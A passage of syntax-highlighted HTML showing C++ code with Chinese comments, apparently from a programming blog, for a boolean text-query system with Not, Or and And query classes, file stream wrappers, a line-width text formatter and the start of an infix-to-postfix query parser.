class="built_in">NotQuery</span>() <span class="keyword">override</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">NotQuery</span>(<span class="type">const</span> Query &amp;q):<span class="built_in">query</span>(q)&#123;&#125;</span><br><span class="line">    <span class="function">string <span class="title">rep</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;~(&quot;</span>+query.<span class="built_in">rep</span>()+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(<span class="type">const</span> TextQuery &amp; text)</span><span class="type">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> sml=query.<span class="built_in">eval</span>(text);</span><br><span class="line">        <span class="keyword">auto</span> smlset=sml.<span class="built_in">getset</span>();</span><br><span class="line">        <span class="keyword">auto</span> allset=sml.<span class="built_in">getfileset</span>();</span><br><span class="line">        set&lt;<span class="type">unsigned</span>&gt; resultset;</span><br><span class="line">        <span class="comment">//包含关系，差集即是非集，大减小即可。集合本身因为迭代特性所以本身就有序。</span></span><br><span class="line">        <span class="built_in">set_difference</span>(allset-&gt;<span class="built_in">begin</span>(),allset-&gt;<span class="built_in">end</span>(),smlset-&gt;<span class="built_in">begin</span>(),smlset-&gt;<span class="built_in">end</span>(),<span class="built_in">inserter</span>(resultset,resultset.<span class="built_in">begin</span>()));</span><br><span class="line">        shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; resultptr=make_shared&lt;set&lt;<span class="type">unsigned</span>&gt;&gt;(resultset);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">QueryResult</span>(<span class="built_in">rep</span>(),resultptr,sml.<span class="built_in">getfile</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    Query query;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">inline</span> Query <span class="keyword">operator</span>~ (<span class="type">const</span> Query &amp;operand)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">shared_ptr</span>&lt;QueryBase&gt;(<span class="keyword">new</span> <span class="built_in">NotQuery</span>(operand));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryQuery</span> : <span class="keyword">public</span> QueryBase&#123;</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span> ~(<span class="type">const</span> Query &amp;);</span><br><span class="line">    <span class="keyword">protected</span>:</span><br><span class="line">    <span class="built_in">BinaryQuery</span>(<span class="type">const</span> Query &amp;l,<span class="type">const</span> Query &amp;r,string s):<span class="built_in">lhs</span>(l),<span class="built_in">rhs</span>(r),<span class="built_in">opSym</span>(s)&#123;&#125;</span><br><span class="line">    <span class="function">string <span class="title">rep</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span>+lhs.<span class="built_in">rep</span>()+<span class="string">&quot; &quot;</span>+opSym+<span class="string">&quot; &quot;</span>+rhs.<span class="built_in">rep</span>()+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Query lhs,rhs;</span><br><span class="line">    string opSym;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OrQuery</span> : <span class="keyword">public</span> BinaryQuery&#123;</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span> |(<span class="type">const</span> Query &amp;,<span class="type">const</span> Query &amp;);</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">OrQuery</span>() <span class="keyword">override</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">OrQuery</span>(<span class="type">const</span> Query &amp;l,<span class="type">const</span> Query &amp; r):<span class="built_in">BinaryQuery</span>(l,r,<span class="string">&quot;|&quot;</span>)&#123;&#125;</span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(<span class="type">const</span> TextQuery &amp;text)</span><span class="type">const</span> </span>&#123;</span><br><span class="line">        <span class="comment">//两个成员分别lhs,rhs。求并集不妨找他们返回的set的共享指针，然后用算法求</span></span><br><span class="line">        <span class="comment">//lhs和rhs都是WordQuery</span></span><br><span class="line">        <span class="keyword">auto</span> r=rhs.<span class="built_in">eval</span>(text),l=lhs.<span class="built_in">eval</span>(text);</span><br><span class="line">        <span class="keyword">auto</span> retlines=l.<span class="built_in">getset</span>();</span><br><span class="line">        retlines-&gt;<span class="built_in">insert</span>(r.<span class="built_in">getset</span>()-&gt;<span class="built_in">begin</span>(),r.<span class="built_in">getset</span>()-&gt;<span class="built_in">end</span>());<span class="comment">//左侧的插入右侧形成并集</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">QueryResult</span>(<span class="built_in">rep</span>(),retlines,l.<span class="built_in">getfile</span>());<span class="comment">//两个file都一样</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">inline</span> Query <span class="keyword">operator</span>| (<span class="type">const</span> Query &amp;lhs,<span class="type">const</span> Query &amp;rhs)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">shared_ptr</span>&lt;QueryBase&gt;(<span class="keyword">new</span> <span class="built_in">OrQuery</span>(lhs,rhs));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AndQuery</span> : <span class="keyword">public</span> BinaryQuery&#123;</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span> &amp;(<span class="type">const</span> Query &amp;,<span class="type">const</span> Query &amp;);</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">AndQuery</span>() <span class="keyword">override</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">AndQuery</span>(<span class="type">const</span> Query &amp;l,<span class="type">const</span> Query &amp; r):<span class="built_in">BinaryQuery</span>(l,r,<span class="string">&quot;&amp;&quot;</span>)&#123;&#125;</span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(<span class="type">const</span> TextQuery &amp;text)</span><span class="type">const</span> </span>&#123;</span><br><span class="line">        <span class="comment">//两个成员分别lhs,rhs。求交集不妨找他们返回的set的共享指针，然后用算法求</span></span><br><span class="line">        <span class="comment">//lhs和rhs都是WordQuery</span></span><br><span class="line">        <span class="keyword">auto</span> r=rhs.<span class="built_in">eval</span>(text),l=lhs.<span class="built_in">eval</span>(text);<span class="comment">//R和L是ResultQE</span></span><br><span class="line">        <span class="keyword">auto</span> lset=l.<span class="built_in">getset</span>(),rset=r.<span class="built_in">getset</span>();</span><br><span class="line">        set&lt;<span class="type">unsigned</span>&gt; resultset;</span><br><span class="line">        <span class="built_in">set_intersection</span>(lset-&gt;<span class="built_in">begin</span>(),lset-&gt;<span class="built_in">end</span>(),rset-&gt;<span class="built_in">begin</span>(),rset-&gt;<span class="built_in">end</span>(),<span class="built_in">inserter</span>(resultset,resultset.<span class="built_in">begin</span>()));</span><br><span class="line">        shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; resultptr=make_shared&lt;set&lt;<span class="type">unsigned</span>&gt;&gt;(resultset);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">QueryResult</span>(<span class="built_in">rep</span>(),resultptr,l.<span class="built_in">getfile</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">inline</span> Query <span class="keyword">operator</span>&amp; (<span class="type">const</span> Query &amp;lhs,<span class="type">const</span> Query &amp;rhs)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">shared_ptr</span>&lt;QueryBase&gt;(<span class="keyword">new</span> <span class="built_in">AndQuery</span>(lhs,rhs));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//文件打开写入操作流</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OFileStream</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    string FilePath;</span><br><span class="line">    ofstream ofile;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">OFileStream</span>(<span class="type">const</span> string &amp;name)&#123;</span><br><span class="line">        ofile.<span class="built_in">close</span>();</span><br><span class="line">        FilePath=name;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">FileExists</span>(name))&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;文件存在，是否进行覆写？(Y/N):&quot;</span>;</span><br><span class="line">            <span class="type">char</span> response;</span><br><span class="line">            cin&gt;&gt;response;</span><br><span class="line">            cin.<span class="built_in">ignore</span>();</span><br><span class="line">            <span class="keyword">if</span>(response==<span class="string">&#x27;Y&#x27;</span>||response==<span class="string">&#x27;y&#x27;</span>)&#123;</span><br><span class="line">                ofile.<span class="built_in">close</span>();</span><br><span class="line">                ofile.<span class="built_in">open</span>(name,ios::out);</span><br><span class="line">                <span class="keyword">if</span>(ofile.<span class="built_in">is_open</span>())&#123;<span class="comment">//判断文件是否已经创建流</span></span><br><span class="line">                    cout&lt;&lt;<span class="string">&quot;文件&quot;</span>&lt;&lt;name&lt;&lt;<span class="string">&quot;成功打开，请写入 :)&quot;</span>&lt;&lt;endl;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    cerr&lt;&lt;<span class="string">&quot;文件&quot;</span>&lt;&lt;name&lt;&lt;<span class="string">&quot;打开出现异常 :(&quot;</span>&lt;&lt;endl;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;保留原有文件，不进行操作&quot;</span>&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//文件不存在的情况</span></span><br><span class="line">            ofile.<span class="built_in">close</span>();</span><br><span class="line">            ofile.<span class="built_in">open</span>(name,ios::out);</span><br><span class="line">            <span class="keyword">if</span>(ofile.<span class="built_in">is_open</span>())&#123;<span class="comment">//判断文件是否已经创建流</span></span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;文件&quot;</span>&lt;&lt;name&lt;&lt;<span class="string">&quot;成功打开，请写入 :)&quot;</span>&lt;&lt;endl;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="type">char</span> ch=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                <span class="keyword">throw</span> ch;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">OFileStream</span>()&#123;</span><br><span class="line">        FilePath=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(ofile.<span class="built_in">is_open</span>())&#123;</span><br><span class="line">            ofile.<span class="built_in">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ofstream&amp; <span class="title">getofsteram</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ofile;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//文件读取操作流</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IFileStream</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    string FilePath;</span><br><span class="line">    ifstream ifile;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">IFileStream</span>(<span class="type">const</span> string &amp;name)&#123;</span><br><span class="line">        FilePath=name;</span><br><span class="line">        <span class="keyword">if</span>(ifile.<span class="built_in">is_open</span>())&#123;<span class="comment">//判断文件是否已经创建流</span></span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;文件&quot;</span>&lt;&lt;name&lt;&lt;<span class="string">&quot;已被打开过... :|&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ifile.<span class="built_in">open</span>(name);</span><br><span class="line">            <span class="keyword">if</span>(ifile.<span class="built_in">is_open</span>())&#123;<span class="comment">//判断文件是否已经创建流</span></span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;文件&quot;</span>&lt;&lt;name&lt;&lt;<span class="string">&quot;可以读取 :)&quot;</span>&lt;&lt;endl;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                string something=<span class="string">&quot;文件&quot;</span>+name+<span class="string">&quot;读取出现异常,不存在的路径 :(&quot;</span>;</span><br><span class="line">                <span class="keyword">throw</span> something;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">IFileStream</span>()&#123;</span><br><span class="line">        FilePath=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(ifile.<span class="built_in">is_open</span>())&#123;</span><br><span class="line">            ifile.<span class="built_in">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">ifstream&amp; <span class="title">getifsteram</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ifile;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FileFormatter</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    OFileStream ost;</span><br><span class="line">    IFileStream ist;</span><br><span class="line">    vector&lt;string&gt; vecbuf;</span><br><span class="line">    vector&lt;string&gt; newbuf;</span><br><span class="line">    <span class="type">unsigned</span> num;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">FileFormatter</span>(<span class="type">const</span> string FilePath,<span class="type">const</span> string newFilePath,<span class="type">unsigned</span> n):<span class="built_in">ist</span>(FilePath),<span class="built_in">ost</span>(newFilePath),<span class="built_in">num</span>(n),<span class="built_in">vecbuf</span>(),<span class="built_in">newbuf</span>()&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">readFromFile</span><span class="params">()</span><span class="comment">//读取源文件</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">//ist是读取文件的留，我们利用它把文件读取到指定的容器vector中。</span></span><br><span class="line">    <span class="comment">//然后再对其进行格式化。所以此函数的作用就是将ist的内容读取出来放到vector中。</span></span><br><span class="line">        <span class="comment">//如果文件不存在，初始化的时候会报错</span></span><br><span class="line">        <span class="comment">//该函数作用域结束后会调用析构函数，不会造成资源浪费。</span></span><br><span class="line">        stringstream ss;</span><br><span class="line">        string temp,t;</span><br><span class="line">        <span class="type">char</span> c[num+<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">getline</span>(ist.<span class="built_in">getifsteram</span>(),temp))&#123;</span><br><span class="line">           <span class="comment">//temp=c;</span></span><br><span class="line">           ss&lt;&lt;temp;</span><br><span class="line">           <span class="keyword">while</span>(ss &gt;&gt; t)&#123;</span><br><span class="line">                vecbuf.<span class="built_in">push_back</span>(t);<span class="comment">//把每个单词放在容器里。</span></span><br><span class="line">           &#125;</span><br><span class="line">           ss.<span class="built_in">clear</span>();<span class="comment">//提取完一行清除字符串流</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">formatText</span><span class="params">()</span><span class="comment">//格式化字符句子</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">//如果单词字符数大于n，则单独独占一行</span></span><br><span class="line">        <span class="comment">//外层循环的结束条件是vector是否用完</span></span><br><span class="line">        <span class="keyword">while</span>(vecbuf.<span class="built_in">size</span>())&#123;</span><br><span class="line">            string str=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(vecbuf.<span class="built_in">front</span>().<span class="built_in">length</span>()&gt;=num)&#123;</span><br><span class="line">                newbuf.<span class="built_in">push_back</span>(vecbuf.<span class="built_in">front</span>());</span><br><span class="line">                vecbuf.<span class="built_in">erase</span>(vecbuf.<span class="built_in">begin</span>());<span class="comment">//删除第一个元素</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">while</span>(str.<span class="built_in">length</span>()&lt;num)&#123;<span class="comment">//对于一个句子，当前句子长度+单词长度大于num就不执行了</span></span><br><span class="line">                <span class="type">bool</span> flag=vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;.&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;;&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;!&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;\&quot;&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;,&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;:&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;?&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(str.<span class="built_in">length</span>()==<span class="number">0</span>)&#123; </span><br><span class="line">                        <span class="comment">//检测巨首是不是标点</span></span><br><span class="line">                        <span class="keyword">if</span>(flag)&#123;<span class="comment">//如果是标点符号，进行处理。</span></span><br><span class="line">                            cerr&lt;&lt;<span class="string">&quot;句首出现标点符号&quot;</span>&lt;&lt;endl;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(!vecbuf.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                            str=vecbuf.<span class="built_in">front</span>();</span><br><span class="line">                            vecbuf.<span class="built_in">erase</span>(vecbuf.<span class="built_in">begin</span>());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="comment">//如果小于，就继续做</span></span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>((str.<span class="built_in">length</span>()+vecbuf.<span class="built_in">front</span>().<span class="built_in">length</span>()+<span class="number">1</span>)&lt;=num&amp;&amp;!flag)&#123;<span class="comment">//句子加单词长度大于num，而不是加符号</span></span><br><span class="line">                        <span class="keyword">if</span>(!vecbuf.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                            str=str+<span class="string">&quot; &quot;</span>+vecbuf.<span class="built_in">front</span>();</span><br><span class="line">                            vecbuf.<span class="built_in">erase</span>(vecbuf.<span class="built_in">begin</span>());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                        <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">                            <span class="keyword">if</span>(!vecbuf.<span class="built_in">empty</span>())&#123;<span class="comment">//如果句尾是标点连着的话，就连续处理</span></span><br><span class="line">                                str=str+<span class="string">&quot; &quot;</span>+vecbuf.<span class="built_in">front</span>();</span><br><span class="line">                                vecbuf.<span class="built_in">erase</span>(vecbuf.<span class="built_in">begin</span>());</span><br><span class="line">                                flag=vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;.&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;;&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;!&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;\&quot;&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;,&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;:&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;?&quot;</span>;</span><br><span class="line">                            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                flag=<span class="literal">false</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        flag=<span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(vecbuf.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                newbuf.<span class="built_in">push_back</span>(str);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">saveToFile</span><span class="params">()</span><span class="comment">//将格式化后的文本内容保存到新的位置和文件名。</span></span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        ofstream&amp; outfile=ost.<span class="built_in">getofsteram</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">const</span> string &amp;s:newbuf)&#123;</span><br><span class="line">            outfile&lt;&lt;s&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">shared_ptr&lt;IFileStream&gt; ifs;</span><br><span class="line">shared_ptr&lt;FileFormatter&gt; ff;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BlankFliter</span><span class="params">(string &amp;str)</span><span class="comment">//使用C++string类的方法快速删除空格</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//std::remove_if函数用于将所有空白字符移动到字符串的末尾，</span></span><br><span class="line">    <span class="comment">//然后使用erase函数将它们从字符串中删除。</span></span><br><span class="line">    <span class="comment">//::isspace函数是一个标准库函数，用于检查一个字符是否为空白字符。</span></span><br><span class="line">    str.<span class="built_in">erase</span>(std::<span class="built_in">remove_if</span>(str.<span class="built_in">begin</span>(), str.<span class="built_in">end</span>(), ::isspace), str.<span class="built_in">end</span>()); </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ExpTraslate</span><span class="params">(string &amp;buf)</span></span>;</span><br><span class="line"><span class="function">string <span class="title">IsNameReturn</span><span class="params">(string &amp;buf)</span></span>&#123;<span class="comment">//针对一个单词的一次性检查</span></span><br><span class="line">    string result;</span><br><span class="line">    <span class="keyword">auto</span> iter = umap.<span class="built_in">find</span>(buf);</span><br><span class="line">    <span class="keyword">if</span>(iter!=umap.<span class="built_in">end</span>())&#123;</span><br><span class="line">        result=iter-&gt;second;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StringTraslate</span><span class="params">(string &amp;buf)</span><span class="comment">//处理用户输入的字符串</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//首先判断是否执行 查询操作</span></span><br><span class="line">    <span class="keyword">if</span>(buf[<span class="number">0</span>]==<span class="string">&#x27;=&#x27;</span>)&#123;</span><br><span class="line">        buf.<span class="built_in">erase</span>(buf.<span class="built_in">begin</span>());</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//然后判断是否执行 赋值 操作</span></span><br><span class="line">    <span class="type">int</span> temp=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> times=<span class="number">0</span>;</span><br><span class="line">    string name,value;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;buf.<span class="built_in">size</span>()<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]==<span class="string">&#x27;&gt;&#x27;</span>&amp;&amp;buf[i+<span class="number">1</span>]==<span class="string">&#x27;&gt;&#x27;</span>)&#123;  </span><br><span class="line">            filename=buf.<span class="built_in">substr</span>(i+<span class="number">2</span>,buf.<span class="built_in">size</span>()-i<span class="number">-2</span>);</span><br><span class="line">            buf=buf.<span class="built_in">substr</span>(<span class="number">0</span>,i);<span class="comment">//前面是查询的单词</span></span><br><span class="line">            filesearch=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;buf.<span class="built_in">length</span>();i++)&#123;<span class="comment">//跳过第一个字符，检查是否有赋值操作</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(buf[i]==<span class="string">&#x27;=&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;buf.<span class="built_in">length</span>();j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(buf[j]==<span class="string">&#x27;\&quot;&#x27;</span>&amp;&amp;times==<span class="number">0</span>)&#123;<span class="comment">//找到&quot;说明是常量</span></span><br><span class="line">                    temp=j+<span class="number">1</span>;</span><br><span class="line">                    times++;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(buf[j]==<span class="string">&#x27;\&quot;&#x27;</span>&amp;&amp;times==<span class="number">1</span>)&#123;</span><br><span class="line">                    value=buf.<span class="built_in">substr</span>(temp,j-temp);</span><br><span class="line">                    times++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(j==buf.<span class="built_in">length</span>()<span class="number">-1</span>)&#123;<span class="comment">//找到最后一位的时候，说明这可能是个变量</span></span><br><span class="line">                    string qwq=buf.<span class="built_in">substr</span>(temp,j-temp);</span><br><span class="line">                    <span class="keyword">auto</span> iter = umap.<span class="built_in">find</span>(qwq);</span><br><span class="line">                    <span class="keyword">if</span>(iter!=umap.<span class="built_in">end</span>())&#123;</span><br><span class="line">                        value=iter-&gt;second;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        cerr&lt;&lt;<span class="string">&quot;输入了一个不存在的变量，如果需要输入常量abcd，请用\&quot;abcd\&quot;包裹常量abcd :(&quot;</span>&lt;&lt;endl;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(times%<span class="number">2</span>)&#123;</span><br><span class="line">                cerr&lt;&lt;<span class="string">&quot;请确保\&quot;abcd\&quot;包裹常量abcd :(&quot;</span>&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">            name=buf.<span class="built_in">substr</span>(<span class="number">0</span>,i);</span><br><span class="line">            umap[name]=value;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//执行表达式处理操作 操作分为分割和计算</span></span><br><span class="line">    <span class="built_in">ExpTraslate</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isOperater</span><span class="params">(string str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(str==<span class="string">&quot;|&quot;</span>||str==<span class="string">&quot;&amp;&quot;</span>||str==<span class="string">&quot;~&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Precedence</span><span class="params">(<span class="type">char</span> op)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="string">&#x27;~&#x27;</span>) <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="string">&#x27;&amp;&#x27;</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="string">&#x27;|&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ExpTraslate</span><span class="params">(string &amp;buf)</span></span>&#123;<span class="comment">//可能出现错误，可以尝试异常处理</span></span><br><span class="line">    stack&lt;shared_ptr&lt;Query&gt;&gt; qstack;</span><br><span class="line">    stack&lt;<span class="type">char</span>&gt; opstack;</span><br><span class="line">    <span class="type">char</span> op;</span><br><span class="line">    vector&lt;string&gt; backexp;</span><br><span class="line">    <span class="type">int</span> word_start=<span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> last_right=buf[buf.<span class="built_in">size</span>()<span class="number">-1</span>]==<span class="string">&#x27;)&#x27;</span>;<span class="comment">//看在最后一个是不是右边括号</span></span><br><span class="line">    <span class="type">bool</span> Had_op=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> priority1;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;buf.<span class="built_in">size</span>();i++)&#123;<span class="comment">//分割字符串并转成后缀表达式</span></span><br><span class="line">        <span class="keyword">if</span>(buf[i]==<span class="string">&#x27;~&#x27;</span>||buf[i]==<span class="string">&#x27;|&#x27;</span>||buf[i]==<span class="string">&#x27;&amp;&#x27;</span>||buf[i]==<span class="string">&#x27;(&#x27;</span>||buf[i]==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">            Had_op=<span class="number">1</span>;</span><br><span class="line">            op=buf[i];</span><br><span class="line">            priority1=<span class="built_in">Precedence</span>(op);</span><br><span class="line">            <span 